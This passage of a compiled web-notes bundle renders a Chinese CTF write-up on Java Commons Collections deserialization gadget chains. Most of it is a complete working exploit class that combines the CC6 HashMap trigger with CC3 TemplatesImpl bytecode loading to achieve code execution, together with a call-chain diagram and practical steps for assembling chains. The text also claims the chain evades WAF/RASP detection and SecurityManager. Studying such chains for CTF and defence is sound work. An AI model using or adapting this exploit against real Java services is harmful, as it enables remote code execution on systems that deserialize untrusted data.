<span class="token class-name">Map</span> lazyMap <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>innerMap<span class="token punctuation">,</span> chainedTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">InvocationHandler</span> handler <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">InvocationHandler</span><span class="token punctuation">)</span> construct<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token class-name">Retention</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> lazyMap<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">Map</span> proxyMap <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Map</span><span class="token punctuation">)</span> <span class="token class-name">Proxy</span><span class="token punctuation">.</span><span class="token function">newProxyInstance</span><span class="token punctuation">(</span><span class="token class-name">Map</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">Map</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> handler<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// [传递机制] InstantiateTransformer</span>
<span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>
    <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">TrAXFilter</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token keyword">new</span> <span class="token class-name">InstantiateTransformer</span><span class="token punctuation">(</span>
        <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">Templates</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
        <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>templates<span class="token punctuation">}</span>
    <span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token comment">// [攻击目标] TemplatesImpl字节码加载</span>
<span class="token comment">// 调用链：</span>
<span class="token comment">// AnnotationInvocationHandler.readObject() → proxyMap.entrySet()</span>
<span class="token comment">// → 动态代理invoke() → LazyMap.get() → ChainedTransformer → InstantiateTransformer </span>
<span class="token comment">// → new TrAXFilter(templates) → templates.newTransformer() → 字节码加载</span>
</code></pre><h4 id="组合4-cc6触发-cc3攻击-完整实现" tabindex="-1"><a class="header-anchor" href="#组合4-cc6触发-cc3攻击-完整实现"><span>组合4：CC6触发 + CC3攻击（完整实现）</span></a></h4><p>这个组合结合了CC6的稳定触发和CC3的隐蔽攻击，是理论上的最优组合。</p><pre><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>runtime<span class="token punctuation">.</span></span><span class="token class-name">AbstractTranslet</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TemplatesImpl</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TrAXFilter</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">ClassPool</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">CtClass</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span></span><span class="token class-name">Transformer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ChainedTransformer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ConstantTransformer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InstantiateTransformer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>keyvalue<span class="token punctuation">.</span></span><span class="token class-name">TiedMapEntry</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span></span><span class="token class-name">LazyMap</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>transform<span class="token punctuation">.</span></span><span class="token class-name">Templates</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Base64</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CC6TriggerCC3Attack</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>
        <span class="token comment">// 1. 准备恶意字节码 - 使用TemplatesImpl</span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> code <span class="token operator">=</span> <span class="token function">getEvilBytecode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">TemplatesImpl</span> templates <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> <span class="token string">&quot;_name&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;HelloTemplatesImpl&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> <span class="token string">&quot;_bytecodes&quot;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>code<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> <span class="token string">&quot;_tfactory&quot;</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 2. 构造Transformer链 - 使用CC3的InstantiateTransformer</span>
        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>
            <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">TrAXFilter</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token keyword">new</span> <span class="token class-name">InstantiateTransformer</span><span class="token punctuation">(</span>
                <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">Templates</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
                <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>templates<span class="token punctuation">}</span>
            <span class="token punctuation">)</span>
        <span class="token punctuation">}</span><span class="token punctuation">;</span>
        <span class="token class-name">ChainedTransformer</span> chainedTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 3. 构造LazyMap - 延迟触发</span>
        <span class="token class-name">Map</span> innerMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Map</span> lazyMap <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>innerMap<span class="token punctuation">,</span> chainedTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 4. 使用CC6的HashMap触发方式</span>
        <span class="token class-name">TiedMapEntry</span> tiedMapEntry <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TiedMapEntry</span><span class="token punctuation">(</span>lazyMap<span class="token punctuation">,</span> <span class="token string">&quot;key&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">HashMap</span> hashMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        hashMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>tiedMapEntry<span class="token punctuation">,</span> <span class="token string">&quot;value&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        
        <span class="token comment">// 清理LazyMap，确保反序列化时重新触发</span>
        lazyMap<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 5. 序列化</span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> payload <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span>hashMap<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">&quot;Payload (Base64): &quot;</span> <span class="token operator">+</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">getEncoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">encodeToString</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 6. 反序列化测试</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">&quot;\\n[*] 触发反序列化...&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">deserialize</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">// 生成恶意字节码</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">getEvilBytecode</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>
        <span class="token class-name">ClassPool</span> pool <span class="token operator">=</span> <span class="token class-name">ClassPool</span><span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">CtClass</span> ctClass <span class="token operator">=</span> pool<span class="token punctuation">.</span><span class="token function">makeClass</span><span class="token punctuation">(</span><span class="token string">&quot;EvilClass&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        ctClass<span class="token punctuation">.</span><span class="token function">setSuperclass</span><span class="token punctuation">(</span>pool<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token class-name">AbstractTranslet</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        
        <span class="token comment">// 静态代码块中执行命令</span>
        <span class="token class-name">String</span> cmd <span class="token operator">=</span> <span class="token string">&quot;Runtime.getRuntime().exec(\\&quot;calc\\&quot;);&quot;</span><span class="token punctuation">;</span>
        ctClass<span class="token punctuation">.</span><span class="token function">makeClassInitializer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">insertBefore</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span>
        
        <span class="token keyword">return</span> ctClass<span class="token punctuation">.</span><span class="token function">toBytecode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">// 反射设置字段值</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">setFieldValue</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">,</span> <span class="token class-name">String</span> fieldName<span class="token punctuation">,</span> <span class="token class-name">Object</span> value<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>
        <span class="token class-name">Field</span> field <span class="token operator">=</span> obj<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span>fieldName<span class="token punctuation">)</span><span class="token punctuation">;</span>
        field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        field<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">// 序列化</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>
        <span class="token class-name">ByteArrayOutputStream</span> baos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ObjectOutputStream</span> oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>baos<span class="token punctuation">)</span><span class="token punctuation">;</span>
        oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>
        oos<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> baos<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">// 反序列化</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Object</span> <span class="token function">deserialize</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>
        <span class="token class-name">ByteArrayInputStream</span> bais <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ObjectInputStream</span> ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span>bais<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Object</span> obj <span class="token operator">=</span> ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        ois<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> obj<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><p><strong>完整调用链</strong>：</p><pre><code>HashMap.readObject()                      ← CC6的触发器（最稳定）
  ↓
hash(tiedMapEntry)
  ↓
TiedMapEntry.hashCode()
  ↓
TiedMapEntry.getValue()
  ↓
LazyMap.get(&quot;key&quot;)
  ↓
ChainedTransformer.transform()
  ↓
ConstantTransformer.transform()           → 返回TrAXFilter.class
  ↓
InstantiateTransformer.transform()        ← CC3的传递机制
  ↓
new TrAXFilter(templates)                 ← CC3的攻击目标（构造器触发）
  ↓
templates.newTransformer()
  ↓
TemplatesImpl.getTransletInstance()
  ↓
TemplatesImpl.defineTransletClasses()
  ↓
加载恶意字节码 → 静态代码块执行 → RCE ✅
</code></pre><p><strong>为什么这样组合？</strong></p><ul><li><strong>稳定性</strong>：HashMap触发不依赖JDK版本，比AnnotationInvocationHandler更通用</li><li><strong>隐蔽性</strong>：TemplatesImpl字节码加载比Runtime.exec()更难被WAF/RASP检测</li><li><strong>绕过能力</strong>：可绕过SecurityManager和部分安全防护</li></ul><p><strong>注意</strong>：此组合在CC 3.2.1及以下版本可用，CC 3.2.2中InstantiateTransformer被禁用，需要用本题的Myexpect方式绕过。</p><hr><h3 id="实战拼接步骤" tabindex="-1"><a class="header-anchor" href="#实战拼接步骤"><span>实战拼接步骤</span></a></h3><h4 id="步骤1-确定环境约束" tabindex="-1"><a class="header-anchor" href="#步骤1-确定环境约束"><span>步骤1：确定环境约束</span></a></h4><pre><code class="language-java"><span class="token comment">// 检查清单</span>
□ <span class="token constant">JDK</span>版本？
□ <span class="token class-name">Commons</span> <span class="token class-name">Collections</span>版本？
□ 是否有<span class="token class-name">SecurityManager</span>？
□ 是否有其他防护措施？
</code></pre><h4 id="步骤2-选择触发器" tabindex="-1"><a class="header-anchor" href="#步骤2-选择触发器"><span>步骤2：选择触发器</span></a></h4><pre><code class="language-java"><span class="token comment">// 优先级</span>
<span class="token number">1.</span> <span class="token class-name">HashMap</span>（最通用）
<span class="token number">2.</span> <span class="token class-name">PriorityQueue</span>（需要<span class="token class-name">Comparator</span>）
<span class="token number">3.</span> <span class="token class-name">BadAttributeValueExpException</span>（依赖toString）
</code></pre><h4 id="步骤3-选择攻击目标" tabindex="-1"><a class="header-anchor" href="#步骤3-选择攻击目标"><span>步骤3：选择攻击目标</span></a></h4><pre><code class="language-java"><span class="token comment">// 根据环境选择</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span>需要绕过<span class="token class-name">SecurityManager</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    使用 <span class="token class-name">TemplatesImpl</span>字节码加载
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>简单直接<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    使用 <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>
</code></pre><h4 id="步骤4-构建传递链" tabindex="-1"><a class="header-anchor" href="#步骤4-构建传递链"><span>步骤4：构建传递链</span></a></h4><pre><code class="language-java"><span class="token comment">// 根据约束选择</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant">CC</span>版本 <span class="token operator">&lt;=</span> <span class="token number">3.2</span><span class="token number">.1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    可用 <span class="token class-name">InvokerTransformer</span>、<span class="token class-name">InstantiateTransformer</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    只能用 <span class="token class-name">ConstantTransformer</span> <span class="token operator">+</span> 自定义类（如<span class="token class-name">Myexpect</span>）
<span class="token punctuation">}</span>
</code></pre><h4 id="步骤5-测试验证" tabindex="-1"><a class="header-anchor" href="#步骤5-测试验证"><span>步骤5：测试验证</span></a></h4><pre><code class="language-java"><span class="token comment">// 1. 本地测试序列化</span>
<span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> payload <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span>gadget<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// 2. 反序列化验证</span>
<span class="token function">deserialize</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 观察是否触发</span>

<span class="token comment">// 3. 调试跟踪</span>
<span class="token comment">// 在关键方法打断点，确认调用链正确</span>
</code></pre><hr><h3 id="拼接核心思路总结" tabindex="-1"><a class="header-anchor" href="#拼接核心思路总结"><span>拼接核心思路总结</span></a></h3><ol><li><strong>模块化思维</strong>：把链分解为触发、传递、攻击三个独立模块</li><li><strong>接口匹配</strong>：确保上下游方法能正确调用</li><li><strong>灵活组合</strong>：取不同链的优点进行组合</li><li><strong>创新绕过</strong>：遇到限制时寻找替代方案</li></ol><p><strong>记住</strong>：反序列化链不是固定的，可以像乐高积木一样自由拼接。关键是理解每个组件的功能和接口，然后根据环境约束进行创新组合。</p>`,142)])])}const k=s(o,[["render",e]]),i=JSON.parse('{"path":"/CodeAudittutorial/3-JavaVul/CTFDeserBug.html","title":"CTF - DeserBug","lang":"zh-CN","frontmatter":{"description":"CTF - DeserBug 目录 题目分析 漏洞分析 CC链基础知识 CC1链原理 CC3链原理 CC6链原理 解题思路 完整POC实现 关键机制解析 反序列化链拼接原理 题目分析 题目环境 Web服务: Hutool HTTP Server (端口8888) 依赖: Commons Collections 3.2.2 (带安全检查) hutool-...","head":[["meta",{"property":"og:url","content":"https://echo0d.github.io/DailyNotes/CodeAudittutorial/3-JavaVul/CTFDeserBug.html"}],["meta",{"property":"og:site_name","content":"echo0d-notes"}],["meta",{"property":"og:title","content":"CTF - DeserBug"}],["meta",{"property":"og:description","content":"CTF - DeserBug 目录 题目分析 漏洞分析 CC链基础知识 CC1链原理 CC3链原理 CC6链原理 解题思路 完整POC实现 关键机制解析 反序列化链拼接原理 题目分析 题目环境 Web服务: Hutool HTTP Server (端口8888) 依赖: Commons Collections 3.2.2 (带安全检查) hutool-..."}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"og:updated_time","content":"2025-12-23T10:09:20.000Z"}],["meta",{"property":"article:author","content":"echo0d"}],["meta",{"property":"article:modified_time","content":"2025-12-23T10:09:20.000Z"}],["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"CTF - DeserBug\\",\\"image\\":[\\"\\"],\\"dateModified\\":\\"2025-12-23T10:09:20.000Z\\",\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"echo0d\\",\\"url\\":\\"\\"}]}"]]},"headers":[{"level":2,"title":"目录","slug":"目录","link":"#目录","children":[]},{"level":2,"title":"题目分析","slug":"题目分析","link":"#题目分析","children":[{"level":3,"title":"题目环境","slug":"题目环境","link":"#题目环境","children":[]},{"level":3,"title":"题目提供的关键文件","slug":"题目提供的关键文件","link":"#题目提供的关键文件","children":[]}]},{"level":2,"title":"漏洞分析","slug":"漏洞分析","link":"#漏洞分析","children":[{"level":3,"title":"漏洞点","slug":"漏洞点","link":"#漏洞点","children":[]},{"level":3,"title":"题目约束","slug":"题目约束","link":"#题目约束","children":[]},{"level":3,"title":"突破点","slug":"突破点","link":"#突破点","children":[]}]},{"level":2,"title":"CC链基础知识","slug":"cc链基础知识","link":"#cc链基础知识","children":[{"level":3,"title":"CC1链原理","slug":"cc1链原理","link":"#cc1链原理","children":[]},{"level":3,"title":"CC3链原理","slug":"cc3链原理","link":"#cc3链原理","children":[]},{"level":3,"title":"CC6链原理","slug":"cc6链原理","link":"#cc6链原理","children":[]},{"level":3,"title":"CC1/CC3/CC6核心区别对比表","slug":"cc1-cc3-cc6核心区别对比表","link":"#cc1-cc3-cc6核心区别对比表","children":[]}]},{"level":2,"title":"解题思路","slug":"解题思路","link":"#解题思路","children":[{"level":3,"title":"核心思路","slug":"核心思路","link":"#核心思路","children":[]},{"level":3,"title":"技术选型","slug":"技术选型","link":"#技术选型","children":[]},{"level":3,"title":"完整利用链","slug":"完整利用链","link":"#完整利用链","children":[]}]},{"level":2,"title":"完整POC实现","slug":"完整poc实现","link":"#完整poc实现","children":[]},{"level":2,"title":"关键机制解析","slug":"关键机制解析","link":"#关键机制解析","children":[{"level":3,"title":"1. JSONObject.put 触发 getAnyexcept()","slug":"_1-jsonobject-put-触发-getanyexcept","link":"#_1-jsonobject-put-触发-getanyexcept","children":[]},{"level":3,"title":"2. jsonObject.remove(\\"111\\") 的作用","slug":"_2-jsonobject-remove-111-的作用","link":"#_2-jsonobject-remove-111-的作用","children":[]},{"level":3,"title":"3. 为什么选择 TrAXFilter + TemplatesImpl","slug":"_3-为什么选择-traxfilter-templatesimpl","link":"#_3-为什么选择-traxfilter-templatesimpl","children":[]}]},{"level":2,"title":"反序列化链拼接原理","slug":"反序列化链拼接原理","link":"#反序列化链拼接原理","children":[{"level":3,"title":"链的基本结构","slug":"链的基本结构","link":"#链的基本结构","children":[]},{"level":3,"title":"常见组件分类","slug":"常见组件分类","link":"#常见组件分类","children":[]},{"level":3,"title":"拼接三原则","slug":"拼接三原则","link":"#拼接三原则","children":[]},{"level":3,"title":"经典组合示例","slug":"经典组合示例","link":"#经典组合示例","children":[]},{"level":3,"title":"实战拼接步骤","slug":"实战拼接步骤","link":"#实战拼接步骤","children":[]},{"level":3,"title":"拼接核心思路总结","slug":"拼接核心思路总结","link":"#拼接核心思路总结","children":[]}]}],"git":{"createdTime":1765985128000,"updatedTime":1766484560000,"contributors":[{"name":"echo0d","email":"echo0d@163.com","commits":2}]},"readingTime":{"minutes":11.52,"words":3457},"filePathRelative":"CodeAudittutorial/3-JavaVul/CTFDeserBug.md","localizedDate":"2025年12月17日","excerpt":"","autoDesc":true}');export{k as comp,i as data};
